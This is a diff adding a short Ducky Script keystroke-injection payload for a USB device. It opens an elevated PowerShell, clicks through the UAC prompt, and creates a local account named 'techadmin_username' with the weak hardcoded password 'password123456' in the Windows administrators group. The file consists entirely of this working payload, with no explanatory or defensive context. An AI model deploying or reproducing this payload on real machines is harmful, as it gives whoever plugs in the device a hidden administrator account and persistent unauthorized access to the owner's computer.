@@ -1,0 +1,24 @@
+﻿REM Elevate CMD and add new user to local administrators group
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 200
+LEFT
+DELAY 4000 
+STRING net user 
+ENTER
+DELAY 2000 
+STRING net user /delete techadmin_username
+ENTER 
+DELAY 2000 
+STRING net user /add techadmin_username password123456
+ENTER 
+DELAY 2000 
+STRING net localgroup administrators /add techadmin_username
+ENTER 
+DELAY 1000
+STRING net localgroup administrators
+ENTER 
